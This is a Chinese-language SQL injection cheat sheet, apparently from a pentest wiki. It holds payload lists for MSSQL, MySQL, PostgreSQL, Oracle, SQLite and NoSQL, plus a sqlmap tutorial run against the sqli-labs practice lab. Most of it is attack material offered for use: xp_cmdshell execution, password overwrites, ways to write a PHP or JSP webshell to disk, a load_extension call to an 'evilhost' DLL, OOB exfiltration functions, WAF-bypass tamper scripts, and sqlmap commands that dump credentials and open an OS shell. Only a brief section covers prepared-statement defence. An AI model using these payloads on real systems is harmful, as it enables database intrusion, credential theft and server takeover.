  -   select concat_ws(table_schema,table_name,column_name) from information_schema.columns

  -   select quotename(name) from master..sysdatabases FOR XML PATH(\'\')

- ##### 执行命令

  -   EXEC xp_cmdshell \'net user\'

- ##### Ascii

  -   SELECT char(0x41)

  -   SELECT ascii(\'A\')

  -   SELECT char(65)+char(66) =\> return AB

- **Delay**

  - WAITFOR DELAY \'0:0:3\' pause for 3 seconds

- ##### Change Password

  -   ALTER LOGIN \[sa\] WITH PASSWORD=N\'NewPassword\'

- ##### Trick

  -   id=1 union:select password from:user

- ##### 文件读取

  -   OpenRowset

- ##### 当前查询语句

  -   select text from sys.dm_exec_requests cross apply sys. dm_exec_sql_text(sql_handle)

- ##### hostname

  -   用于判断是否站库分离

  -   select host_name()

  -   exec xp_getnetname

- ##### 服务器信息

  -   exec xp_msver

- ##### 系统配置

  -   select \* from sys.configurations;

##### 注册表读写

-   **xp_regread**
    -   exec xp_regread N\'HKEY_LOCAL_MACHINE\', N\'SYSTEM\\CurrentControlSet\\Services\\MSSEARCH\'

-   xp_regwrite

-   xp_regdeletvalue

-   xp_regdeletkey

-   xp_regaddmultistring

##### 报错注入

-   1=convert(int,(db_name()))

##### 常用函数

-   SUSER_NAME()

-   USER_NAME()

-   PERMISSIONS()

-   DB_NAME()

-   FILE_NAME()

-   TYPE_NAME()

-   COL_NAME()

##### DNS OOB

-   fn_xe_file_target_read_file

-   fn_get_audit_file

-   fn_trace_gettable

##### 其他常用存储过程

-   sp_execute_external_script

-   sp_makewebtask

-   sp_OACreate

-   sp_OADestroy

-   sp_OAGetErrorInfo

-   sp_OAGetProperty

-   sp_OAMethod

-   sp_OASetProperty

-   sp_OAStop

-   xp_cmdshell

-   xp_dirtree

-   xp_enumerrorlogs

-   xp_enumgroups

-   xp_fixeddrives

-   xp_getfiledetails

-   xp_loginconfig

#### MySQL Payload

##### 常见Payload

- **Version**

  -   SELECT @@version

- ##### Comment

  -   SELECT 1 \-- comment

  -   SELECT 1 \# comment

  -   SELECT /\*comment\*/1

- ##### Space

  - 0x9 0xa-0xd 0x20 0xa0

- ##### Current User

  -   SELECT user()

  -   SELECT system_user()

  -   SELECT current_role()

- ##### List User

  -   SELECT user FROM mysql.user

- ##### Current Database

  -   SELECT database()

- ##### List Database

  -   SELECT schema_name FROM information_schema.schemata

- ##### List Tables

  -   SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\'

- ##### List Columns

  -   SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != \'mysql\' AND table_schema != \'information_schema\'

- ##### **If**

  - SELECT if(1=1,\'foo\',\'bar\'); return 'foo'

- **Ascii**

  - SELECT char(0x41)
  - SELECT ascii(\'A\')

  - SELECT 0x414243 =\> return ABC

- **Delay**

  - sleep(1)
  - SELECT BENCHMARK(1000000,MD5(\'A\'))

- ##### Read File

  -   select @@datadir

  -   select load_file(\'databasename/tablename.MYD\')

- ##### Blind

  -   ascii(substring(str,pos,length)) & 32 = 1

- ##### Error Based

  -   select count(\*),(floor(rand(0)\*2))x from information_schema.tables group by x;

  -   select count(\*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1), floor(rand(0)\*2))

- ##### Change Password

  -   mysql -uroot -e \"use mysql;UPDATE user SET password=PASSWORD(\'newpassword\') WHERE user=\'root\';FLUSH PRIVILEGES;\"

##### 报错注入常见函数

-   extractvalue

-   updatexml

-   GeometryCollection

-   linestring

-   multilinestring

-   multipoint

-   multipolygon

-   polygon

-   exp

#### 写文件

##### 写文件前提

-   root 权限

-   知晓文件绝对路径

-   写入的路径存在写入权限

-   secure_file_priv 允许向对应位置写入

-   select count(file_priv) from mysql.user

##### 基于into写文件

```sql
union select 1,1,1 into outfile '/tmp/demo.txt'
union select 1,1,1 into dumpfile '/tmp/demo.txt'
```

dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏

##### 基于log写文件

```sql
show variables like '%general%';
set global general_log = on;
set global general_log_file = '/path/to/file';
select '<?php var_dump("test");?>';
set global general_log_file = '/original/path';
set global general_log = off;
```

#### PostgresSQL Payload

- **Version**

  -   SELECT version()

- ##### Comment

  -   SELECT 1 \-- comment

  -   SELECT /\*comment\*/1

- ##### Current User

  -   SELECT user

  -   SELECT current_user

  -   SELECT session_user

  -   SELECT getpgusername()

- ##### List User

  -   SELECT usename FROM pg_user

- ##### Current Database

  -   SELECT current_database()

- ##### List Database

  -   SELECT datname FROM pg_database

- ##### Ascii

  - SELECT char(0x41)
  - SELECT ascii(\'A\')

- ##### **Delay**

  - ##### pg_sleep(1)

#### Oracle Payload

##### 常见Payload

- ##### dump

  - select \* from v\$tablespace;
  - select \* from user_tables;

  - select column_name from user_tab_columns where table_name = \'table_name\';

  - select column_name, data_type from user_tab_columns where table_name = \'table_name\';

  - SELECT \* FROM ALL_TABLES

- ##### Comment

  - ##### -- –

  - ##### /\*\*/

- ##### Space

  - 0x00 0x09 0xa-0xd 0x20

- ##### **报错**

  - utl_inaddr.get_host_name
  - ctxsys.drithsx.sn

  - ctxsys.CTX_REPORT.TOKEN_TYPE

  - XMLType

  - dbms_xdb_version.checkin

  - dbms_xdb_version.makeversioned

  - dbms_xdb_version.uncheckout

  - dbms_utility.sqlid_to_sqlhash

  - ordsys.ord_dicom.getmappingxpath

  - utl_inaddr.get_host_name

- ##### OOB

  - utl_inaddr.get_host_address
  - utl_http.request

  - utl_inaddr.get_host_address

  - SYS.DBMS_LDAP.INIT

  - HTTPURITYPE

  - HTTP_URITYPE.GETCLOB

- **绕过**

  - rawtohex

##### 写文件

```sql
create or replace directory TEST_DIR as '/path/to/dir';
grant read, write on directory TEST_DIR to system;
declare
isto_file utl_file.file_type;
begin
isto_file := utl_file.fopen('TEST_DIR', 'test.jsp', 'W');
utl_file.put_line(isto_file, '<% out.println("test"); %>');
utl_file.fflush(isto_file);
utl_file.fclose(isto_file);
end;
```

#### SQLite3 Payload

- ##### Comment（注释）

  -  \--
  -  /\*\*/

- ##### Version

  -   select sqlite_version();

Command Execution

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
```

Load_extension

UNION SELECT 1,load_extension(\'\\\\evilhost\\evil.dll\',\'E\');\--

#### NoSQL Payload

##### 常见Payload

- ##### 绕过限制条件

  -   {\"username\": \"user\"} =\> {\"username\": {\"ne\": \"fakeuser\"}}

  -   {\"\$where\": \"return true\"}

- ##### 测试用字符

  - ##### ' \" \\ / \$ \[ \] . \>

- ##### 布尔测试常用

  - {\"\$ne\": -1}
  - {\"\$in\": \[\]}
  - {\"\$where\": \"return true\"}
  - {\"\$or\": \[{},{\"foo\":\"1\"}\]}

- ##### 时间

  - {\"\$where\": \"sleep(100)\"}

# 9.预编译

#### 简介

SQL 注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的 SQL引擎进行解析为 AST 或 Opcode，第二次交互发送数据，代入 AST 或 Opcode 中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。

#### 模拟预编译

为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。

#### 绕过

#### 预编译使用错误

预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。

#### 部分参数不可预编译

在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。

#### 预编译实现错误

部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。

# 10.参考文章

#### Tricks

-   [sqlmap time based inject 分析](http://blog.wils0n.cn/archives/178/)

-   [SQLInjectionWiki](https://github.com/NetSPI/SQLInjectionWiki)

-   [常见数据库写入 Webshell 汇总](https://mp.weixin.qq.com/s/BucCNyCmyATdRENZp0AF2A)

-   [MSSQL 数据库攻击实战指北](https://mp.weixin.qq.com/s/uENvpPan7aVd7MbSoAT9Dg)

#### Bypass

-   [SQL 注入 ByPass 的一些小技巧](https://mp.weixin.qq.com/s/fSBZPkO0-HNYfLgmYWJKCg)

-   [Waf Bypass 之道](https://xz.aliyun.com/t/368)

-   [MySQL Bypass Wiki](https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI)

#### NoSQL

-   [NoSQL 注入的分析和缓解](http://www.yunweipai.com/archives/14084.html)
-   [NoSQL 注入](https://mp.weixin.qq.com/s/tG874LNTIdiN7MPtO-hovA)



# sqlmap使用详解

sqlmap是一个开源的渗透测试工具，它可以自动化检测和利用SQL注入缺陷以及接管数据库服务器的过程。它有一个强大的检测引擎，许多适合于终极渗透测试的小众特性和广泛的开关，从数据库指纹，从数据库获取数据到访问底层文件系统和通过带外连接在操作系统上执行命令。

## 1.判断注入点

```
python sqlmap.py -u http://192.168.37.148/sql/Less-7/index.php?id=1
```

## 2.重要的sqlmap使用语句

```shell
sqlmap -r http.txt  #http.txt是我们抓取的http的请求包
sqlmap -r http.txt -p username  #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   #探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"   --cookie="抓取的cookie"   #当该网站需要登录时，探测该url是否存在漏洞
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --data="uname=admin&passwd=admin&submit=Submit"  #抓取其post提交的数据填入
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users      #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords  #查看数据库用户名的密码
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user  #查看数据库当前的用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba    #判断当前用户是否有管理员权限
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles     #列出数据库所有管理员角色，仅适用于oracle数据库的时候
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --dbs        #爆出所有的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --tables     #爆出所有的数据表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --columns    #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"    --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump  #爆出数据库security中的users表中的username列中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all   #爆出数据库security中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all  #爆出该数据库中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1"  --tamper=space2comment.py  #指定脚本进行过滤，用/**/代替空格
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell  #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd   #执行--os-shell命令，获取目标服务器权限
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1 " --file-write  test.txt  --file-dest "e:/hack.txt"  #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL"     #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, 　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　SAP MaxDB, SQLite, Sybase
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent   #使用任意的User-Agent爆破
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="127.0.0.1:8080"    #指定代理
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T    #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。
```



```powershell
支持的探测方式如下：
　　B: Boolean-based blind SQL injection（布尔型注入）
　　E: Error-based SQL injection（报错型注入）
　　U: UNION query SQL injection（可联合查询注入）
　　S: Stacked queries SQL injection（可多语句查询注入）
　　T: Time-based blind SQL injection（基于时间延迟注入）

-v3                   #输出详细度  最大值5 会显示请求包和回复包
--threads 5           #指定线程数
--fresh-queries       #清除缓存
--flush-session       #刷新session  
--batch               #对所有的交互式的都是默认的
--random-agent        #任意的http头
--tamper base64encode            #对提交的数据进行base64编码
--referer http://www.baidu.com   #伪造referer字段
--keep-alive          #保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received.
```



```powershell
-u     指定目标URL (可以是http协议也可以是https协议)
-d     连接数据库
--dbs  列出所有的数据库
--current-db 列出当前数据库
--tables 列出当前的表
--columns 列出当前的列
-D 选择使用哪个数据库
-T 选择使用哪个表
-C 选择使用哪个列
--dump 获取字段中的数据
--batch 自动选择yes
--smart 启发式快速判断，节约浪费时间
--forms 尝试使用post注入
-r 加载文件中的HTTP请求（本地保存的请求包txt文件）
-l 加载文件中的HTTP请求（本地保存的请求包日志文件）
-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试
-o 开启所有默认性能优化
--tamper 调用脚本进行注入
-v 指定sqlmap的回显等级
--delay 设置多久访问一次
--os-shell 获取主机shell，一般不太好用，因为没权限
-m 批量操作
-c 指定配置文件，会按照该配置文件执行动作
-data data指定的数据会当做post数据提交
-timeout 设定超时时间
-level 设置注入探测等级
--risk 风险等级
--identify-waf 检测防火墙类型
--param-del="分割符" 设置参数的分割符
--skip-urlencode 不进行url编码
--keep-alive 设置持久连接，加快探测速度
--null-connection 检索没有body响应的内容，多用于盲注
--thread 最大为10 设置多线程
```



### \--delay

有些web服务器请求访问太过频繁可能会被防火墙拦截，使用--delay就可以设定两次http请求的延时

<img src="https://www.pianshen.com/images/732/b938238fa92627dd6629ccc52fb89084.png" alt="img" style="zoom: 80%;" />

 

### \--safe-url

有的web服务器会在多次错误的访问请求后屏蔽所有请求，使用--safe-url 就可以每隔一段时间去访问一个正常的页面。

 

### \--tamper

语法：\--tamper ["脚本名称"]

当调用多个脚本的时候，脚本之间用`,`隔开，调用的脚本在 sqlmap文件夹下的 tamper 文件夹中

```powershell
apostrophemask.py       用UTF-8全角字符替换单引号字符
apostrophenullencode.py    用非法双字节unicode字符替换单引号字符
appendnullbyte.py       在payload末尾添加空字符编码
base64encode.py        对给定的payload全部字符使用Base64编码
between.py           分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py          在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py      对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py         对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py      对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py      用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py        用“LIKE”运算符替换全部等于号“=”
greatest.py          用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py      用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py         用小写值替换每个关键字字符
modsecurityversioned.py    用注释包围完整的查询
modsecurityzeroversioned.py  用当中带有数字零的注释包围完整的查询
multiplespaces.py       在SQL关键字周围添加多个空格
nonrecursivereplacement.py  用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py        转换给定的payload当中的所有字符
percentage.py         在每个字符之前添加一个百分号
randomcase.py         随机转换每个关键字字符的大小写
randomcomments.py       向SQL关键字中插入随机注释
securesphere.py        添加经过特殊构造的字符串
sp_password.py        向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py       用“/**/”替换空格符
space2dash.py         用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符
space2hash.py         用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py       用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py      用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py      用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py      用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py      用破折号注释符“--”其次是一个换行符替换空格符
space2plus.py         用加号“+”替换空格符
space2randomblank.py     用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py      用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py       用一个多字节组合%bf%27和末尾通用注释一起替换空格符 宽字节注入
varnish.py          添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py     用MySQL注释包围每个非函数关键字
versionedmorekeywords.py   用MySQL注释包围每个关键字
xforwardedfor.py       添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
```

 

### -v ["x"]

使用sqlmap注入测试时，可以使用 -v [x] 参数来指定回显信息的复杂程度, x 的取值范围为[0~6]:

| 等级 | 解释                         |
| ---- | ---------------------------- |
| 0    | 只显示python错误以及严重信息 |
| 1    | 同时显示基本信息和警告信息   |
| 2    | 同时显示debug信息            |
| 3    | 同时显示注入的pyload         |
| 4    | 同时显示HTTP请求             |
| 5    | 同时显示HTTP相应头           |
| 6    | 同时显示HTTP相应页面         |



### \--level

level有5个等级，默认等级为1，进行Cookie测试时使用--level 2 ，进行use-agent或refer测试时使用--level 3 ，进行 host 测试时使用--level 5

 

### –-os-cmd=["命令"] 或 --os-shell=["命令"] 执行系统命令

利用sql-labs-less1测试 whoami 命令

sqlmap -u "http://192.168.0.6/sqli-labs-master/Less-1/?id=1" --os-cmd=whoami

选择web服务器支持的语言

<img src="https://www.pianshen.com/images/214/d6023e62536a7ca3969c3021c121ed16.png" alt="img" style="zoom:67%;" />

 

 选择web服务器的可写目录

[1] 使用默认的

[2] 自定义位置

[3] 自定义目录列表文件

[4] 暴力搜索

<img src="https://www.pianshen.com/images/673/b50cb6b7b63d963dae16f922f09e49a1.png" alt="img" style="zoom:67%;" />

我在本地测试，节省时间，我选择2 ，自定义路径，然后把路径输入在下面

<img src="https://www.pianshen.com/images/429/e82a0cdf0d4d93002a0491e9fa44d78d.png" alt="img" style="zoom:67%;" />

执行命令后的返回结果

<img src="https://www.pianshen.com/images/965/a7dc39184bdd0948f6092ec514b78e25.png" alt="img" style="zoom:67%;" />



## 3.sql注入

### 1.get型：

语法：sqlmap -u ["url"]

```powershell
sqlmap -u http://192.168.0.6/sqli-labs-master/Less-1/?id=1
```

<img src="https://www.pianshen.com/images/81/d6223546ac7c13efdfbe9529a1de8e21.png" alt="img" style="zoom:80%;" />

注入步骤：

```powershell
step1：sqlmap -u ["URL"] //测试是否存在注入
step2：sqlmap -u ["URL"] -current-db //查询当前数据库
step3：sqlmap -u ["URL"] -D ["数据库名"] --tables //查询当前数据库中的所有表
step4：sqlmap -u ["URL"] -D ["数据库名"] -T ["表名"] --columns //查询指定库中指定表的所有列(字段)
step5：sqlmap -u ["URL"] -D ["数据库名"] -T ["表名"] -C ["列名"] --dump //打印出指定库中指定表指定列中的字段内容
```

以下关卡均可用get型的方法，常规注入：

| GET型           | 关卡                   |
| --------------- | ---------------------- |
| sql-labs-less1  | GET单引号字符型注入    |
| sql-labs-less2  | 数字型注入             |
| sql-labs-less3  | 有括号的单引号报错注入 |
| sql-labs-less4  | 有括号的双引号报错注入 |
| sql-labs-less5  | 单引号二次注入         |
| sql-labs-less6  | 双引号二次注入         |
| sql-labs-less7  | 文件导入导出           |
| sql-labs-less8  | 布尔型盲注             |
| sql-labs-less9  | 时间型盲注             |
| sql-labs-less10 | 双引号时间盲注         |

 

### 2.post型

先使用bp把提交的数据包保存下来

![img](https://www.pianshen.com/images/949/baa5b8ea571864e8f935d1839bda5895.png)

或者直接

<img src="https://www.pianshen.com/images/484/79849e9cf5ba3230fd8428685656d0cc.png" alt="img" style="zoom:80%;" />

加上post提交的参数

<img src="https://www.pianshen.com/images/599/bc274789872177572d2dde23ee4d77c7.png" alt="img" style="zoom: 67%;" />

语法：`sqlmap -r ["请求包的txt文件"]`

```powershell
sqlmap -r "/root/.sqlmap/post.txt"
```

 <img src="https://www.pianshen.com/images/319/7282abf22155843ebcd0719725a7b37f.png" alt="img" style="zoom:80%;" />

sql-labs -less1~sql-labs-less9

获取当前数据库名称：

语法：`sqlmap -u [“url”] --current-db`

```powershell
sqlmap -u "http://192.168.0.6/sqli-labs-master/Less-1/?id=1" --current-db
```

<img src="https://www.pianshen.com/images/138/4f678edd6d7ccac89625506358c87232.png" alt="img" style="zoom:80%;" />

获取指定数据库的表名：

语法：`sqlmap -u [“url”] -D [‘数据库名’] --tables`

```powershell
sqlmap -u "192.168.0.6/sqli-labs-master/Less-1/?id=1" -D security --tables
```

<img src="https://www.pianshen.com/images/395/cb841d3ea4db3e8651e2c35aa32e56a3.png" alt="img" style="zoom:80%;" />

 

获取指定数据库指定表中的字段：

语法：`sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns`

```powershell
sqlmap -u "192.168.0.6/sqli-labs-master/Less-1/?id=1" -D security -T users --columns
```

<img src="https://www.pianshen.com/images/361/b1da4ac564b363595edd6b17496ee579.png" alt="img" style="zoom:80%;" />

获取指定数据库指定表的指定字段的字段内容：

语法：`sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump`

```powershell
sqlmap -u "192.168.0.6/sqli-labs-master/Less-1/?id=1" -D security -T users -C password --dump
```

<img src="https://www.pianshen.com/images/183/e43d7998849f1adac22573c75cb5341f.png" alt="img" style="zoom:80%;" />

 

 sql-labs-less10

```powershell
sqlmap -u "http://192.168.0.6/sqli-labs-master/Less-10/?id=1" --current-db
```

 <img src="https://www.pianshen.com/images/308/50c659c66485cddcc1cce6bc8a067eb4.png" alt="img" style="zoom:80%;" />

提升等级 -level 2

```powershell
sqlmap -u "http://192.168.0.6/sqli-labs-master/Less-10/?id=1" -level 2 --current-db
```

 ![img](https://www.pianshen.com/images/731/6867dc9f29f0b2aae32630f58f216dcb.png)

 

 sql-labs-less11~less17常规 POST 注入步骤：

```powershell
step1：sqlmap -r ["请求头文本"] //测试是否存在注入
step2：sqlmap -r ["请求头文本"] --current-db //查询当前数据库
step3：sqlmap -r ["请求头文本"] -D ["数据库名"] --tables //查询当前数据库的所有表
step4：sqlmap -r ["请求头文本"] -D ["数据库名"] -T ["表名"] --columns //查询指定库指定表的所有列
step5：sqlmap -r ["请求头文本"] -D ["数据库名"] -T ["表名"] -C ["列名"] --dump //打印出指定库指定表指定列的所有字段内容
```



| POST            | 关卡                       | 类型 |
| --------------- | -------------------------- | ---- |
| sql-labs-less11 | 基于错误的单引号字符型注入 |      |
| sql-labs-less12 | 基于错误的双引号字符型注入 |      |
| sql-labs-less13 | 单引号变形双注入           |      |
| sql-labs-less14 | 双引号变形双注入           |      |
| sql-labs-less15 | Bool型时间延迟单引号盲注   |      |
| sql-labs-less16 | Bool型时间延迟双引号盲注   |      |
| sql-labs-less17 | 更新查询注入               |      |
| sql-labs-less18 | Uagent注入                 |      |
| sql-labs-less19 | Referer注入                |      |
| sql-labs-less20 | Cookie注入                 |      |



## 4.特别注入实战

### 1.sql-labs-less18 Header injection - Uagent

sqlmap 在对user-agent 注入的时候，得在文件中的user-agent的参数后面加上 *

<img src="https://www.pianshen.com/images/843/01e3844ff1a147e34507d4adcfda4f3b.png" alt="img" style="zoom:80%;" />

 

 <img src="https://www.pianshen.com/images/436/14015b983908ae1926f9734fe80eafec.png" alt="img" style="zoom:80%;" />

 

或者不加 * 号，调用 --level参数，将等级调至 3级，只有等级为 3级即以上时才能对 user-agent进行注入

```powershell
sqlmap -r "/root/.sqlmap/post.txt" -level 3
```

 <img src="https://www.pianshen.com/images/39/6db659197a1948ef4d417ac7992556cf.png" alt="img" style="zoom:80%;" />

 

 <img src="https://www.pianshen.com/images/510/34ed893a6d94c7d94b529b6ae6e05f56.png" alt="img" style="zoom:80%;" />



### 2.sql-labs-less19 Header injection - Referer

对Referer注入和User-agent相同，要么是在Referer后面加上 *

<img src="https://www.pianshen.com/images/347/b570e2bd4ed4782b49addfc4e18702b3.png" alt="img" style="zoom:80%;" />

 

 <img src="https://www.pianshen.com/images/816/7735eaad93286527ae5f006a4d80edf8.png" alt="img" style="zoom:80%;" />

或者将 level 调至 3 级

<img src="https://www.pianshen.com/images/226/0ca73a779609f702f0b17370999b4632.png" alt="img" style="zoom:80%;" />

 

 <img src="https://www.pianshen.com/images/452/a3d20b944dcc598cec8e39d04ce886b4.png" alt="img" style="zoom:80%;" />



### 3.sql-labs-less20 Header injection -Cookie

语法：`sqlmap -u [“url”] --cookie ["cookie信息"] --level 2`

```powershell
sqlmap -u "http://192.168.0.6/sqli-labs-master/Less-20/index.php" --cookie "pma_lang=zh_CN;pma_mcrypt_iv=AoXpKxU5KcY%3D;pmaUser-1=7%2FwV%2BDOfbmI%3D;uname=admin;" --level 2
```

<img src="https://www.pianshen.com/images/328/b3eb59463b010b53b9a222c8afd6c6f8.png" alt="img" style="zoom:80%;" />

 

 <img src="https://www.pianshen.com/images/418/3195bbf1002954d58aa610a35f5677e2.png" alt="img" style="zoom:80%;" />



